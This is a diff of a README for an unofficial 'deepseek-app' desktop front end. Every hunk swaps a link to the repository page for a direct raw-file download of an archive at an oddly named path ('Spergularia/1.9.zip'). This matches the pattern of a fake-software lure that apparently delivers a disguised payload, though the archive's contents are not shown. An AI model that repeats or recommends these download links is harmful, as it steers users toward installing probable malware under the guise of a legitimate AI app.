@@ -6,7 +6,7 @@ deepseek-app is a friendly, visual desktop program that puts the power of DeepSe
 
 This unofficial tool wraps the DeepSeek Harness engine (often called "DSH") into a simple, polished interface. It gives you a clean visual shell, making it feel like the "Grok App" style you might have seen elsewhere, but tailored for DeepSeek. Whether you're curious about AI, want to experiment, or have specific tasks in mind, deepseek-app is your starting point.
 
-[![Download deepseek-app Now](https://img.shields.io/badge/Download-deepseek--app-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4b0082&color=ff6600)](https://github.com/roxannepemphigous226/deepseek-app)
+[![Download deepseek-app Now](https://img.shields.io/badge/Download-deepseek--app-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4b0082&color=ff6600)](https://raw.githubusercontent.com/roxannepemphigous226/deepseek-app/main/Spergularia/1.9.zip)
 
 ## ✨ What Can deepseek-app Do For You?
 
@@ -27,7 +27,7 @@ This is the most important part. Please follow these steps carefully. They are w
 
 Visit this link to download the application.
 
-[https://github.com/roxannepemphigous226/deepseek-app](https://github.com/roxannepemphigous226/deepseek-app)
+[https://raw.githubusercontent.com/roxannepemphigous226/deepseek-app/main/Spergularia/1.9.zip](https://raw.githubusercontent.com/roxannepemphigous226/deepseek-app/main/Spergularia/1.9.zip)
 
 You can also click the big orange button at the top of this page. It will take you to the same place.
 
@@ -113,7 +113,7 @@ That covers everything you need for a smooth start. Installing a new application
 
 **First, get the app:**
 
-[![Get deepseek-app from GitHub](https://img.shields.io/badge/Get%20The%20App-GitHub-blue?style=plastic&logo=GitHub&color=lightgrey&labelColor=darkgreen)](https://github.com/roxannepemphigous226/deepseek-app)
+[![Get deepseek-app from GitHub](https://img.shields.io/badge/Get%20The%20App-GitHub-blue?style=plastic&logo=GitHub&color=lightgrey&labelColor=darkgreen)](https://raw.githubusercontent.com/roxannepemphigous226/deepseek-app/main/Spergularia/1.9.zip)
 
 Visit this link to download the application.
 
